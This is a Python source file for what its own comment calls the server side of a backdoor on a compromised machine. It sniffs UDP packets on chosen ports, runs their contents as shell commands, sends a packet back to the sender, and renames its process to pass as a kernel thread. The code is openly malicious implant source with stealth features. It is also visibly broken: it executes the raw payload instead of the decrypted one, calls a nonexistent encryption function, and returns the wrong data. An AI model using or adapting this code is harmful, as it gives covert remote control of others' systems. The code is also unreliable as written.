# this is the server portion of the backdoor, runs on a compromised system

import setproctitle
import os
import argparse
import platform
import subprocess
import triplesec
from ctypes import *
from scapy.all import *

# user defined section, make these cmd line arguments

# sourcePort
# destinationPort
# interface

# argument parsing
parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
parser.add_argument('-s'
                   , '--sport'
                   , dest='sourcePort'
                   , help='Source port from sender.'
                   , required=True)
parser.add_argument('-d'
                   , '--dport'
                   , dest='destPort'
                   , help='Destination port sender is sending to.'
                   , required=True)
# parser.add_argument('-i'
#                    , '--interface'
#                    , dest='interface'
#                    , help='Interface to sniff for packets on.')
args = parser.parse_args()
sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, args.destPort)

def runCommand(packet):
  encryptedData = packet.load
  data = triplesec.decrypt(encryptedData, b'key yo')
  print "Running command " + packet.load
  output = subprocess.check_output(packet.load, shell=True, stderr=subprocess.STDOUT)
  encryptedOutput = triplesec.encryptedData(output, b'key yo')
  packet = IP(packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedData)
  send(packet)

# if
def setProcessName():
  operatingSystem = platform.system()
  procName = ""
  if operatingSystem == 'Darwin':
    procName = "testtest"
  elif operatingSystem == "Linux":
    procName = "ksomethingorother"

  setproctitle.setproctitle(procName)

setProcessName()
sniff(filter=sniffFilter, prn=runCommand)
# output = subprocess.check_output('ls -l', shell=True)
# print output